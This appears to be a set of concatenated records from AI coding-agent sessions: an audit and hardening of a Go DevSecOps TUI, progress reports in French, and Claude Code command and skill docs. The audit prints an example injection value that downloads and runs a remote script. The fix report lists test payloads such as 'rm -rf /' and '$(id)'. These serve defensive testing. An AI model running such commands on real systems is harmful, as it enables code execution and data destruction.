2	
3	## 1. 🕸️ Gestion et Diagnostic Réseau Avancés
4	- [x] **Visualisation topologique :** Un écran montrant quels conteneurs communiquent sur quels réseaux Docker pré-existants.
5	- [x] **Ping/Curl inter-conteneurs :** Une interface permettant d'exécuter rapidement un test de connectivité (ex: "Depuis *Conteneur A*, fais une requête HTTP vers *Conteneur B* : port 8080") sans avoir à ouvrir un shell manuellement.
6	- [ ] **Gestionnaire de "Port Forwarding" :** Un tableau de bord interactif pour gérer les redirections de ports vers la machine hôte.

8	## 2. 🛡️ Remédiation Sécurité Interactive (DevSecOps)
9	- [ ] **Assistance à la mise à jour (Auto-Patch) :** Après le scan Trivy, proposer de générer automatiquement un patch ou un `Dockerfile` mis à jour changeant la version de l'image de base pour corriger les CVE critiques.
10	- [ ] **Scan au niveau du code (SAST local) :** Intégrer des outils de linting de sécurité (comme `gitleaks` pour les secrets ou des linters IaC) directement dans la vue "Workspace".
11	
12	## 3. 📉 Analyseur de Build et de Cache OCI
13	- [ ] **Visualisation des calques (Layers) :** Analyser une image locale pour afficher la taille de chaque couche (à la manière de l'outil `dive`).
14	  - Implémentation intégrée via `google/go-containerregistry` (approche "daemonless" sans dépendance au démon Docker).
15	  - Interaction directe avec les registres OCI (pull des manifestes et configs sans télécharger l'image entière).
16	  - Lecture en streaming des calques en mémoire (format `tar`) pour recréer l'arborescence des fichiers système.
17	  - Calcul de l'espace gaspillé via la détection des fichiers whiteouts (`.wh.`).
18	- [ ] **Analyse de "Cache Miss" :** Indiquer pourquoi la mise en cache d'un build a échoué (ex: "Le fichier package.json a été modifié, invalidant le cache").
19	
20	## 4. 🚀 "Injection" d'Environnement (Dev Containers Spontanés)
21	- [ ] **Injection de configuration :** Permettre d'injecter les dotfiles du développeur (configuration vim, zsh, alias) dynamiquement lors de l'ouverture d'un terminal dans un conteneur.
22	- [ ] **Montage de volume "à chaud" :** Ajouter la possibilité de monter le répertoire de travail actuel (`pwd`) dans un conteneur existant à la volée pour tester un script local sans avoir à rebuild l'image.
23	
24	## 5. 📊 Tableau de bord des Ressources (Mini-htop intégré)
25	- [ ] **Graphiques TUI :** Une vue avec des graphiques en TUI (utilisant des caractères braille) représentant l'utilisation en temps réel du CPU, de la RAM et des I/O réseau pour tous les conteneurs du projet sélectionné.
26	- [ ] **Alertes visuelles :** Possibilité de définir des alertes visuelles (ex: saturation mémoire).

content.text:
Analysis complete. Here's what I found.

## What it is

**DevDesk** — a Go/Bubble Tea TUI "DevSecOps cockpit", 33,232 lines across 103 Go files in 28 packages. Nine views (dashboard, status, GitLab auth/explorer, workspaces, security, containers, OCI resources, netdiag) behind a central router in `internal/app/app.go:56`, driven by a vim-style `:` command mode.

Most functionality is delegated to external binaries: `docker` (88 `exec.Command` call sites), Trivy, Gitleaks, plus the GitLab API client. Ephemeral containers are the execution substrate for network diagnostics.

## Health checks — all green

```
go build ./...        ✅
go vet ./...          ✅
golangci-lint run     ✅  0 issues
go test ./...         ✅  all pass
```

Rule compliance is genuinely good where it's mechanically checkable: zero hardcoded hex outside `theme/colors.go`, zero `lipgloss.Join*` calls, no `bubbles/textarea`, no `style.Render()` inside `table.Row{}`. Rule 110 also holds — Cmd closures consistently capture locals (`capturedOpts`, `capturedName` at `internal/ui/security/model.go:693`) rather than touching the model.

## Problems worth acting on

**1. The repo has zero commits.** `git log` → *"your current branch 'main' does not have any commits yet"*. All 33k lines are untracked, no remote configured. One `rm -rf` from total loss.

**2. Test coverage is bimodal and mostly absent.**

| Tested | | Untested |
|---|---|---|
| `command` | 89.7% | all 14 `ui/*` packages — 0% |
| `config` | 88.7% | `docker` — 4.0% |
| `theme` | 78.9% | `app` — 6.6% |
| `cache` | 71.3% | `gitlab` — 7.5% |
| `status` | 64.8% | `scan` — 10.3% |

Roughly 20k of 33k lines have no test. Your own rule mandates 80%. Also: `go test -race` **cannot run here** — `CGO_ENABLED=0` and no C toolchain, so the race-detector requirement in `.claude/rules/code-quality.md` is currently unenforceable.

**3. Shell injection in `RunSSLCert`** — `internal/docker/netdiag.go:91`

```go
shellCmd := fmt.Sprintf(`echo | openssl s_client ... -servername %s -connect %s ...`, target, connect)
return runDiagHost(image, []string{"/bin/sh", "-c", shellCmd})
```

`target` comes straight from the netdiag form (`internal/ui/netdiag/model.go:535`), validated only for non-emptiness. A target of `x; wget attacker.sh -O-|sh` executes in a container running `--network host`. Every sibling function (`RunPing`, `RunNetcat`, `RunCurl`) correctly uses argv — this is the lone `sh -c` one. Fix: drop the `grep` pipe and parse output in Go, or validate `target` against `isIPAddress`/hostname rules (the helper already exists at `model.go:135`).

**4. Privileged host-namespace containers.** `RunSS` and `KillProcess` (`internal/docker/network.go:25,62`) run `--privileged --pid=host --net=host`. `kill -9` therefore targets **host** PIDs, from a TUI table row behind `ctrl+k`. The argv is safe; the capability is the risk — worth a confirmation modal, if there isn't one.

**5. No platform abstraction.** Zero build-tag files. `internal/ui/netdiag/model.go:143` opens `/etc/resolv.conf` unconditionally; `network.go:38-40` bind-mounts `/etc/resolv.conf`, `/etc/hosts`, `/etc/nsswitch.conf`. `--net=host` doesn't behave the same on Docker Desktop. `runtime.GOOS` is checked in 7 spots, but only for opening editors/terminals — never for the Docker layer. Your `todo.md:28` already points at a `platform_compatibility_improvements.md` plan, so this is known.

**6. Nine files exceed the 800-line ceiling** from `.claude/rules/coding-style`: `ui/security/model.go` (1985), `ui/oci_resources/update.go` (1698), `app/app.go` (1549), `gitlab/explorer/model.go` (1403), `ui/workspaces/model.go` (1299), `docker/client.go` (1176), `ui/netdiag/model.go` (1047), plus two more.

**7. Codemaps drifted.** `docs/CODEMAPS/INDEX.md` claims "~31,000 LOC across 97 Go files"; actual is 33,232 across 103. Dated 2026-03-28.

## Suggested order

1. `git add . && git commit` — then push somewhere. Everything else is moot until this is done.
2. Patch `RunSSLCert`.
3. Set `CGO_ENABLED=1` + a C toolchain so `-race` actually runs, given TEA concurrency is a core project rule.
4. Backfill tests on `docker` and `scan` (pure parsers like `parseSSOutput` are cheap wins), then the view `Update()` functions.

Want me to fix the injection and get the repo committed?

chore: initial commit

Import of DevDesk, a Bubble Tea TUI for DevSecOps workflows: system status
monitoring, GitLab integration, Trivy/Gitleaks scanning, Docker and OCI
resource management, and network diagnostics.

Includes security hardening applied at import time:

- RunSSLCert built its shell pipeline with fmt.Sprintf, interpolating the
  user-supplied target and port directly into a "sh -c" string executed in a
  container running --network host. A target such as `example.com; wget ...`
  broke out of the intended command. The target and port are now passed as
  positional arguments ("sh -c <script> sh <target> <port>"), so the shell
  never parses them as script text.

- netdiag now validates the target (IP address or RFC 1035 hostname) and the
  port (1-65535) before any test runs, rejecting shell metacharacters at the
  form boundary rather than relying on the callee.

- The container log and inspect pagers embed a container ID in a host shell
  command line. Both now verify the ID is hexadecimal via docker.IsContainerID
  before building the command.

Table-driven tests cover the new validators, including the injection payloads
that motivated the change.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>
EOF

content.text:
Corrections terminées. Voici ce qui a été fait — et ce qui reste.

## Corrigé

**1. Injection shell dans `RunSSLCert`** — `internal/docker/netdiag.go:90`

Le `fmt.Sprintf` qui construisait le pipeline est remplacé par un passage en arguments positionnels :

```go
const sslCertScript = `... -servername "$1" -connect "$1:$2" ...`
runDiagHost(image, []string{"/bin/sh", "-c", sslCertScript, "sh", target, port})
```

Le shell reçoit `target` et `port` comme argv — il ne les parse jamais comme du texte de script. Le pipeline `openssl | openssl | grep` est conservé tel quel (un seul run de conteneur).

**2. Validation des entrées netdiag** — `internal/ui/netdiag/model.go`

`validateTarget()` (IP via `net.ParseIP`, ou hostname RFC 1035) et `validatePort()` (1–65535) sont appelés en tête de `startTests()`. Les métacaractères sont rejetés à la frontière du formulaire, avec un message footer clair au lieu d'une sortie conteneur incompréhensible. La duplication `target`/`port` plus bas dans la fonction a été supprimée, et `"443"` est devenu la constante `defaultPort`.

**3. Durcissement des pagers** — `internal/docker/identifier.go` (nouveau) + `internal/ui/containers/update.go:370,478`

`docker.IsContainerID()` vérifie hex 12–64 caractères. Les deux pagers (`docker logs` et `docker inspect`, qui interpolent un ID dans un shell **hôte**) refusent maintenant un ID malformé. Ce n'était pas exploitable en pratique — les IDs viennent de `docker ps` — mais c'était le même anti-pattern.

**4. Tests** — 2 fichiers, 4 fonctions table-driven, incluant les payloads d'injection (`; rm -rf /`, `$(id)`, backticks, newline, échappement de quote) comme cas de non-régression. `internal/ui/netdiag` passe de 0 à un premier fichier de test.

**5. Tâches `test-race` / `cover`** — `mise.toml` + `Makefile`. `CGO_ENABLED=1` est désormais explicite, avec la dépendance au toolchain C documentée dans la description.

**6. Codemaps rafraîchis** — 97 fichiers/~31k LOC → 105/~33k, date au 2026-08-01.

**7. Commit initial** — `654b2ba`, arbre de travail propre. J'ai vérifié avant de committer qu'aucun secret ne partait : les seuls hits sont des placeholders (`glpat-xxxxxxxx` dans `auth/model.go:60`).

Vérification finale : `go build` ✅ · `go vet` ✅ · `golangci-lint` 0 issue ✅ · 11 packages de tests passants ✅

## Non corrigé — et pourquoi

- **Couverture globale.** Je n'ai couvert que les validateurs ajoutés. Les 13 autres packages `ui/*` restent à 0 %, `docker` à 5 %. Atteindre les 80 % de ta règle est un chantier en soi, pas un effet de bord de ces correctifs.
- **Race detector.** Aucun gcc/clang sur le PATH — je ne peux pas installer un compilateur C sans ton accord. `make test-race` échouera désormais avec un message explicite plutôt qu'énigmatique.
- **9 fichiers > 800 lignes.** `security/model.go` (1985), `oci_resources/update.go` (1698), `app.go` (1549)… Découper ça touche à l'architecture des vues ; ça mérite un plan dédié, pas un passage en fin de session.
- **Couche Docker non portable.** `--net=host`, `--pid=host` et les montages `/etc/*` supposent un hôte Linux. Ton `.claude/plans/platform_compatibility_improvements.md` couvre déjà le sujet.
- **Pas de remote.** Le dépôt est committé mais reste local — rien à pousser tant que tu n'as pas configuré l'origine GitLab.

Si tu veux enchaîner, le plus rentable est la couverture sur `internal/docker` et `internal/scan` : les parsers y sont purs et testables sans Docker.

# Plan Command

This command creates a comprehensive implementation plan before writing any code. It accepts either free-form requirements or a PRD markdown file.

Run inline by default. Do not call the Task tool or any subagent by default. This keeps `/plan` usable from plugin installs that ship commands without agent files.

## What This Command Does

1. **Restate Requirements** - Clarify what needs to be built
2. **Identify Risks** - Surface potential issues and blockers
3. **Create Step Plan** - Break down implementation into phases
4. **Wait for Confirmation** - MUST receive user approval before proceeding

## When to Use

Use `/plan` when:
- Starting a new feature
- Making significant architectural changes
- Working on complex refactoring
- Multiple files/components will be affected
- Requirements are unclear or ambiguous

## How It Works

The assistant will:

1. **Analyze the request** and restate requirements in clear terms
2. **Ground the plan** in relevant codebase patterns when the repo is available
3. **Break down into phases** with specific, actionable steps
4. **Identify dependencies** between components
5. **Assess risks** and potential blockers
6. **Estimate complexity** (High/Medium/Low)
7. **Present the plan** and WAIT for your explicit confirmation

## Input Modes

| Input | Mode | Behavior |
|---|---|---|
| `path/to/name.prd.md` | PRD artifact mode | Read the PRD, pick the next pending delivery milestone or implementation phase, and write `.claude/plans/{name}.plan.md` |
| Any other markdown path | Reference mode | Read the file as context and produce an inline plan |
| Free-form text | Conversational mode | Produce an inline plan |
| Empty input | Clarification mode | Ask what should be planned |

In PRD artifact mode, create `.claude/plans/` if needed. If the PRD contains a `Delivery Milestones` table, update only the selected row from `pending` to `in-progress` and set its `Plan` cell to the generated plan path. If the PRD uses the legacy `.claude/PRPs/prds/` format with `Implementation Phases`, read it without migrating paths.

## Pattern Grounding

Before writing the plan, search the codebase for conventions the implementation should mirror. Capture the top example for each relevant category with file references:

| Category | What to capture |
|---|---|
| Naming | File, function, type, command, or script naming in the affected area |
| Error handling | How failures are raised, returned, logged, or handled gracefully |
| Logging | Levels, format, and what gets logged |
| Data access | Repository, service, query, or filesystem patterns |
| Tests | Test file location, framework, fixtures, and assertion style |

If no similar code exists, state that explicitly. Do not invent a pattern.

## PRD Artifact Output

When called with a `.prd.md` file, write the plan to `.claude/plans/{kebab-case-name}.plan.md` using this structure:

````markdown
# Plan: {Feature Name}

**Source PRD**: {path}
**Selected Milestone**: {milestone or phase name}
**Complexity**: {Small | Medium | Large}

## Summary
{2-3 sentences}

## Patterns to Mirror
| Category | Source | Pattern |
|---|---|---|
| Naming | `path:line` | {short description} |
| Errors | `path:line` | {short description} |
| Tests | `path:line` | {short description} |

## Files to Change
| File | Action | Why |
|---|---|---|
| `path` | CREATE / UPDATE / DELETE | {reason} |

## Tasks
### Task 1: {name}
- **Action**: {what to do}
- **Mirror**: {pattern to follow}
- **Validate**: {command that proves correctness}

## Validation
```bash
{project-specific validation commands}
```

## Risks
| Risk | Likelihood | Mitigation |
|---|---|---|

## Acceptance
- [ ] All tasks complete
- [ ] Validation passes
- [ ] Patterns mirrored, not reinvented
````

After writing the artifact, report its path and WAIT for confirmation before writing code.

## Example Usage

```
User: /plan I need to add real-time notifications when markets resolve

Assistant:
# Implementation Plan: Real-Time Market Resolution Notifications

## Requirements Restatement
- Send notifications to users when markets they're watching resolve
- Support multiple notification channels (in-app, email, webhook)
- Ensure notifications are delivered reliably
- Include market outcome and user's position result

## Implementation Phases

### Phase 1: Database Schema
- Add notifications table with columns: id, user_id, market_id, type, status, created_at
- Add user_notification_preferences table for channel preferences
- Create indexes on user_id and market_id for performance

### Phase 2: Notification Service
- Create notification service in lib/notifications.ts
- Implement notification queue using BullMQ/Redis
- Add retry logic for failed deliveries
- Create notification templates

### Phase 3: Integration Points
- Hook into market resolution logic (when status changes to "resolved")
- Query all users with positions in market
- Enqueue notifications for each user

### Phase 4: Frontend Components
- Create NotificationBell component in header
- Add NotificationList modal
- Implement real-time updates via Supabase subscriptions
- Add notification preferences page

## Dependencies
- Redis (for queue)
- Email service (SendGrid/Resend)
- Supabase real-time subscriptions

## Risks
- HIGH: Email deliverability (SPF/DKIM required)
- MEDIUM: Performance with 1000+ users per market
- MEDIUM: Notification spam if markets resolve frequently
- LOW: Real-time subscription overhead

## Estimated Complexity: MEDIUM
- Backend: 4-6 hours
- Frontend: 3-4 hours
- Testing: 2-3 hours
- Total: 9-13 hours

**WAITING FOR CONFIRMATION**: Proceed with this plan? (yes/no/modify)
```

## Important Notes

**CRITICAL**: This command will **NOT** write any code until you explicitly confirm the plan with "yes" or "proceed" or similar affirmative response.

If you want changes, respond with:
- "modify: [your changes]"
- "different approach: [alternative]"
- "skip phase 2 and do phase 3 first"

## Integration with Other Commands

After planning:
- Use the `tdd-workflow` skill to implement with test-driven development
- Use `/build-fix` if build errors occur
- Use `/code-review` to review completed implementation
- Use `/pr` or `/prp-pr` to open a pull request

> **Need requirements first?** Use `/plan-prd` for a lean PRD at `.claude/prds/{name}.prd.md`.
>
> **Need the legacy PRP flow?** Use `/prp-plan` for deep PRP planning with `.claude/PRPs/` artifacts. Use `/prp-implement` to execute those plans with rigorous validation loops.

## Optional Planner Agent

ECC also provides a `planner` agent for manual installs that include agent files. Use it only when the local runtime already exposes that subagent and the user explicitly asks you to delegate planning.

If the `planner` subagent is unavailable, continue planning inline instead of surfacing an "Agent type 'planner' not found" error.

For manual installs, the source file lives at:
`agents/planner.md`

Trois découvertes changent la forme du plan :

- **`make` n'est pas installé** sur cette machine — le Makefile documenté dans `README.md` et `.claude/CLAUDE.md` est déjà inutilisable ici. La migration régularise l'existant plutôt qu'elle ne casse quelque chose.
- **mise exécute les tâches via `cmd /c` sur Windows** (`windows_default_inline_shell_args` = `cmd /c`). Deux tâches actuelles sont donc cassées : `clean` (`rm -rf bin`) et `run` (`./bin/dk`).
- **Aucun fichier CI** dans le dépôt (ni `.gitlab-ci.yml`, ni Dockerfile) — rien à migrer côté pipeline.

---

# Plan d'implémentation : migration Makefile → mise

## Reformulation du besoin

Faire de `mise.toml` la source unique de vérité pour les tâches de développement, supprimer le `Makefile`, et aligner toute la documentation. La migration doit être **sans perte** : aucune capacité présente dans le Makefile ne doit disparaître.

## Analyse d'écart

| Cible | Makefile | mise.toml | Action |
|---|---|---|---|
| `build` `dev` `test` `test-race` `fmt` `vet` `tidy` `deps` `install` | ✅ | ✅ | Aucune |
| `cover` | ✅ | ❌ | **Porter** |
| `lint` `check` | ❌ | ✅ | Aucune (bonus déjà présent) |
| `help` | ✅ (target custom) | natif `mise tasks` | Ne pas porter — documenter |
| `run` | `./bin/dk` | `./bin/dk` | **Corriger** (casse sous `cmd`) |
| `clean` | `rm -rf` + `go clean` | `rm -rf` + `go clean` | **Corriger** (casse sous `cmd`) |
| Echos de progression | ✅ | ❌ | Abandonner (mise affiche déjà `[task] $ cmd`) |
| `VERSION?=dev` | déclarée, **jamais utilisée** | ❌ | **Décision** — voir ci-dessous |

## Points de décision

**1. Variable `VERSION` — code mort.** Elle est déclarée ligne 5 du Makefile et référencée nulle part. Deux options :

- *(recommandé)* La laisser tomber. C'est du code mort ; l'introduire dans mise serait porter une dette.
- La câbler réellement : `go build -ldflags "-X main.version=$VERSION"` + une variable `version` dans `main.go`. C'est une **fonctionnalité nouvelle**, hors périmètre d'une migration — à traiter séparément si tu la veux.

Je pars sur l'abandon, sauf indication contraire.

**2. Shell des tâches sous Windows.** Pour que `clean` et `run` fonctionnent partout, deux approches :

- *(recommandé)* Forcer un shell POSIX : `[settings] windows_default_inline_shell_args = "bash -c"` dans `mise.toml`. Cohérent avec le reste du projet, qui suppose déjà des sémantiques POSIX (Docker `--net=host`, montages `/etc/*`). Git Bash est présent sur cette machine.
- Rendre chaque tâche cross-platform (`go clean -cache` au lieu de `rm -rf`, chemins sans `./`). Plus portable, mais plus verbeux et ça ne règle pas le problème de fond.

**3. Suppression du Makefile.** Je le supprime — c'est l'objet de la demande. Si tu veux une transition douce pour d'éventuels collaborateurs, on peut garder un Makefile de 3 lignes qui délègue à mise ; dis-le et je l'ajoute.

## Phases

### Phase 1 — Combler les écarts dans `mise.toml`
- Ajouter `[settings] windows_default_inline_shell_args = "bash -c"`.
- Ajouter la tâche `cover` (`go test -cover ./...`).
- Corriger `run` : `bin/dk` sans préfixe `./`, ou passer par un `depends` + exécution directe.
- Vérifier `clean` sous le nouveau shell.

### Commands

Tasks are defined in `mise.toml`. Run `mise tasks` to list them with descriptions.

```bash
mise run dev        # Run with go run (fastest iteration loop)
mise run build      # Build binary to bin/dk
mise run test       # Run all tests
mise run cover      # Test coverage per package
mise run fmt        # Format code (go fmt)
mise run vet        # Static analysis (go vet)
mise run lint       # Full linter (golangci-lint, mandatory before committing)
mise run tidy       # Tidy go.mod / go.sum
mise run check      # fmt + vet + lint + test (pre-commit checklist)
mise run test-race  # Race condition detection (needs a C toolchain, see below)
```

`test-race` requires cgo, so a C compiler (`gcc` or `clang`) must be on `PATH`.
Without one, `go test -race` fails with `cgo: C compiler "gcc" not found`.

On Windows, tasks that use POSIX syntax declare `shell = "bash -c"` and therefore
need Git Bash, which ships with Git for Windows.

## Écart par rapport au plan validé

Le point 2 que tu avais confirmé (`[settings] windows_default_inline_shell_args = "bash -c"`) **ne fonctionne pas** : mise refuse ce réglage depuis une config projet pour raison de sécurité, et émettait un WARN à chaque invocation. Je suis passé à l'option de repli — `shell = "bash -c"` déclaré par tâche — qui elle fonctionne, et je l'ai vérifiée en exécutant `clean`.

Les deux autres décisions sont appliquées telles que validées : `VERSION` abandonnée, Makefile supprimé sans shim.

## Ce qui a été fait

| Phase | Résultat |
|---|---|
| 1. Écarts comblés | `cover` portée ; `shell = "bash -c"` sur `clean` et `run` |
| 2. Validation | 12 tâches exécutées en réel, 1 vérifiée partiellement, 1 non exécutée |
| 3. Suppression | `git rm Makefile` |
| 4. Docs | `README.md` (3 blocs), `.claude/CLAUDE.md` (bloc commandes) |
| 5. Commit | `0f79fdb`, atomique |

Les codemaps ne mentionnaient ni `make` ni `Makefile` — rien à corriger de ce côté, contrairement à ce que je supposais dans le plan.

## Résultats de validation

`build` `clean` `vet` `fmt` `tidy` `deps` `cover` `lint` `test` `check` — tous verts. `mise tasks` liste bien 14 tâches.

Deux réserves, à dire clairement :

- **`run` n'a pas été exécuté de bout en bout** : il lance le TUI en plein écran, ce qui aurait bloqué la session. J'ai validé que `./bin/dk` se résout et est exécutable sous bash, pas que l'appli démarre. À confirmer de ton côté.
- **`install` n'a pas été exécuté** : ton `$GOPATH/bin` n'existe pas encore, et installer un binaire est une modification de ton environnement que tu n'avais pas demandée. La commande est un `go install .` identique à celle du Makefile.

`test-race` échoue toujours — `cgo: C compiler "gcc" not found`. C'est le prérequis manquant, désormais documenté dans les deux fichiers de doc, pas une régression de la migration.

## Effet de bord vérifié

`mise run tidy` a réécrit `go.mod`, qui est apparu modifié. Comparaison octet à octet avec `HEAD` : identique. C'était un stat périmé, et le fichier n'est pas entré dans le commit.

Voilà la suite traitée : la couverture de tests, en commençant par les parsers — le code le plus exposé aux régressions silencieuses.

## Bug réel trouvé et corrigé

`parseIfaceState` (`internal/ui/netdiag/topology_model.go`) ne lisait que les *flags* de l'en-tête `ip addr show`, qui portent l'état **administratif**. Une interface débranchée s'annonce ainsi :

```
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN
                                          ^^                              ^^^^
                                    flag admin                     état opérationnel
```

Le parser voyait `,UP>` et affichait **UP**. Dans un outil de diagnostic réseau, une carte sans lien signalée comme active est exactement l'inverse de ce qu'on attend.

Correction : le token `state` fait désormais autorité quand le driver le renseigne. Le piège évité, c'est `state UNKNOWN` — les interfaces tun/tap le rapportent systématiquement tout en étant opérationnelles, donc `operState()` renvoie un booléen « connu / inconnu » et on retombe sur les flags dans ce cas. Un VPN reste UP, `docker0` débranché passe DOWN, et `lo` garde son libellé LOOP.

Les deux cas sont verrouillés par des tests (`docker0` et `tun0`).

## Couverture

| Package | Avant | Après |
|---|---|---|
| `internal/ui/netdiag` | 2,2 % | **15,9 %** |
| `internal/registrymgr` | 0 % | **18,5 %** |
| `internal/docker` | 5,0 % | **7,3 %** |

Trois fichiers de tests créés, tous en table-driven avec des fixtures verbatim d'`ip addr` / `ip -s link` / `iptables -L` / `nft list ruleset` — les simplifier aurait vidé le test de son intérêt, puisque ces parsers n'existent que pour absorber les variations de format.

Couverts : `parseIPAddr`, `parseIfaceState`, `operState`, `parseIPLink`, `parseIPRoute`, `parseIPNeigh`, `parseFirewall` et ses deux backends, `parseSize`, `parseNetIO`, `parseNexusURL`, `cleanMemberAlias`.

`parseSize` n'avait pas de défaut malgré son apparence : il ne décode pas les unités binaires (`1.5GiB` → 0), mais ses trois appelants passent tous par `units.HumanSize` de Docker, qui produit du SI décimal. La mémoire, seule à utiliser des unités binaires, est formatée ailleurs. J'ai documenté ce contrat dans le fichier de test pour que personne ne « corrige » le mauvais bout.

## Vérifications

`go build`, `go vet`, `gofmt`, `golangci-lint` (0 issue sur les trois packages) et `go test ./...` — tout passe, aucun FAIL.

Reste inchangé depuis l'analyse initiale : le détecteur de race toujours bloqué (pas de gcc), les 13 packages `ui/*` encore à 0 %, et les 9 fichiers au-dessus du plafond de 800 lignes qui demandent un plan dédié.

Je n'ai rien commité — dis-moi si tu veux que je commit et push ce lot.

# /skill-create - Local Skill Generation

Analyze your repository's git history to extract coding patterns and generate SKILL.md files that teach Claude your team's practices.

## Usage

```bash
/skill-create                    # Analyze current repo
/skill-create --commits 100      # Analyze last 100 commits
/skill-create --output ./skills  # Custom output directory
/skill-create --instincts        # Also generate instincts for continuous-learning-v2
```

## What It Does

1. **Parses Git History** - Analyzes commits, file changes, and patterns
2. **Detects Patterns** - Identifies recurring workflows and conventions
3. **Generates SKILL.md** - Creates valid Claude Code skill files
4. **Optionally Creates Instincts** - For the continuous-learning-v2 system

## Analysis Steps

### Step 1: Gather Git Data

```bash
# Get recent commits with file changes
git log --oneline -n ${COMMITS:-200} --name-only --pretty=format:"%H|%s|%ad" --date=short

# Get commit frequency by file
git log --oneline -n 200 --name-only | grep -v "^$" | grep -v "^[a-f0-9]" | sort | uniq -c | sort -rn | head -20

# Get commit message patterns
git log --oneline -n 200 | cut -d' ' -f2- | head -50
```

### Step 2: Detect Patterns

Look for these pattern types:

| Pattern | Detection Method |
|---------|-----------------|
| **Commit conventions** | Regex on commit messages (feat:, fix:, chore:) |
| **File co-changes** | Files that always change together |
| **Workflow sequences** | Repeated file change patterns |
| **Architecture** | Folder structure and naming conventions |
| **Testing patterns** | Test file locations, naming, coverage |

### Step 3: Generate SKILL.md

Output format:

```markdown
---
name: {repo-name}-patterns
description: Coding patterns extracted from {repo-name}
version: 1.0.0
source: local-git-analysis
analyzed_commits: {count}
---

# {Repo Name} Patterns

## Commit Conventions
{detected commit message patterns}

## Code Architecture
{detected folder structure and organization}

## Workflows
{detected repeating file change patterns}

## Testing Patterns
{detected test conventions}
```

### Step 4: Generate Instincts (if --instincts)

For continuous-learning-v2 integration:

```yaml
---
id: {repo}-commit-convention
trigger: "when writing a commit message"
confidence: 0.8
domain: git
source: local-repo-analysis
---

# Use Conventional Commits

## Action
Prefix commits with: feat:, fix:, chore:, docs:, test:, refactor:

## Evidence
- Analyzed {n} commits
- {percentage}% follow conventional commit format
```

## Example Output

Running `/skill-create` on a TypeScript project might produce:

```markdown
---
name: my-app-patterns
description: Coding patterns from my-app repository
version: 1.0.0
source: local-git-analysis
analyzed_commits: 150
---

# My App Patterns

## Commit Conventions

This project uses **conventional commits**:
- `feat:` - New features
- `fix:` - Bug fixes
- `chore:` - Maintenance tasks
- `docs:` - Documentation updates

## Code Architecture

```
src/
├── components/     # React components (PascalCase.tsx)
├── hooks/          # Custom hooks (use*.ts)
├── utils/          # Utility functions
├── types/          # TypeScript type definitions
└── services/       # API and external services
```

## Workflows

### Adding a New Component
1. Create `src/components/ComponentName.tsx`
2. Add tests in `src/components/__tests__/ComponentName.test.tsx`
3. Export from `src/components/index.ts`

### Database Migration
1. Modify `src/db/schema.ts`
2. Run `pnpm db:generate`
3. Run `pnpm db:migrate`

## Testing Patterns

- Test files: `__tests__/` directories or `.test.ts` suffix
- Coverage target: 80%+
- Framework: Vitest
```

## GitHub App Integration

For advanced features (10k+ commits, team sharing, auto-PRs), use the [Skill Creator GitHub App](https://github.com/apps/skill-creator):

- Install: [github.com/apps/skill-creator](https://github.com/apps/skill-creator)
- Comment `/skill-creator analyze` on any issue
- Receives PR with generated skills

## Related Commands

- `/instinct-import` - Import generated instincts
- `/instinct-status` - View learned instincts
- `/evolve` - Cluster instincts into skills/agents

input.content:
---
name: entire
description: Drive the Entire CLI (entire) for checkpoints, agent sessions, code provenance, and multi-agent review. Use when the user mentions Entire, checkpoints, session tracking, "entire why/blame/experts", agent activity recaps, or when a repo contains .entire/ and you need to inspect or manage tracked agent work.
origin: local-cli-analysis
tools: Bash, Read, Grep, Glob
---

# Entire CLI

Entire records agent work as **checkpoints** — persistent records tied to commits — and tracks **sessions** across worktrees. This skill covers driving its CLI.

## Rule 1: the CLI documents itself — never guess flags

Entire ships a machine-readable help surface that always matches the installed binary:

```bash
entire agent-help                      # command map + when to use each
entire agent-help <command>            # exact flags for the installed version
entire agent-help <command> <sub>      # drill further
entire agent-help <command> --json     # structured output
```

**Read it before composing any non-trivial invocation.** The CLI evolves quickly; a
flag list memorised in a skill file goes stale, the self-help does not. This file
therefore documents *which command solves which problem* and the traps — command
names are stable, flags are not.

If a command errors on an unknown flag, do not guess a variant. Run
`entire agent-help <command>` and read the real surface.

## Rule 2: never ask the user for the repo

Entire auto-detects the repository from the git `origin` remote. You are already
inside it.

- Pass `--repo` **only** to target a *different* repo than the current one.
- Repo slugs take several forms: `gh/owner/repo` (GitHub-backed), `et/proj/repo`
  (Entire-native), plain `owner/repo`, or a ULID.

`entire agent-help` prints the detected repo in its footer — use that to confirm
which repo you are acting on before any write operation.

## Command map

| Need | Command |
|---|---|
| What did the agent do here? | `checkpoint explain`, `checkpoint list` |
| Find past work by meaning | `checkpoint search` |
| Who/what produced this line? | `why`, `blame` |
| Which agent knows this area? | `experts` |
| Session state, stop, resume | `session` |
| Activity summary | `recap`, `activity` |
| Written summary of recent work | `dispatch` |
| Is Entire on? | `status`, `enable`, `disable` |
| Something is stuck | `doctor` |
| Remove local session data | `clean` |
| Settings (telemetry, hooks, backend) | `configure` |
| Install agent hooks | `agent add/remove/list` |
| Raw API call | `api` |
| Orgs / projects / repos / access | `org`, `project`, `repo`, `grant` |
| Auth | `login`, `logout`, `auth` |
| Experimental workflows | `labs` |

## Provenance — the highest-value commands

These answer questions plain git cannot, because they join commits to the prompts
and sessions that produced them.

```bash
entire why <file>:42            # commit + checkpoint + prompt + session behind a line
entire blame <file>:12-20       # git-blame enriched with checkpoint metadata
entire blame <file> --long      # adds agent, model, author, session columns
entire experts <scope-or-query> # rank agent provenance for a code scope
entire experts --staged         # use staged paths as the scope
```

All three accept `--json`. Reach for `entire why` before speculating about *why*
code looks a certain way — it often returns the literal prompt that produced it.

## Search

```bash
entire checkpoint search "fix login"          # hybrid semantic + keyword, current repo
entire checkpoint search "..." --all-repos    # widen scope
entire checkpoint search "..." --code         # search code content instead
entire checkpoint search "..." --json --limit 20
```

Queries support inline filters: `author:<name>`, `date:<week|month>`,
`branch:<name>`, `repo:<owner/name>`, `repo:*`.

Requires `entire login` (GitHub device flow). Run with no arguments for an
interactive picker — **avoid that in an agent context**, pass a query and `--json`.

## Reading a checkpoint

```bash
entire checkpoint list                     # checkpoints on the current branch
entire checkpoint explain <id|sha>         # auto-detects checkpoint ID vs commit SHA
entire checkpoint explain <id> --short     # summary only
entire checkpoint explain <id> --json      # metadata only; never embeds transcript bytes
entire checkpoint explain <id> --transcript # stream raw JSONL transcript to stdout
```

Checkpoint IDs may be abbreviated to any unambiguous prefix. A commit carrying an
`Entire-Checkpoint:` trailer resolves as a positional target too.

`--json` and `--transcript` are deliberately separate surfaces: metadata never
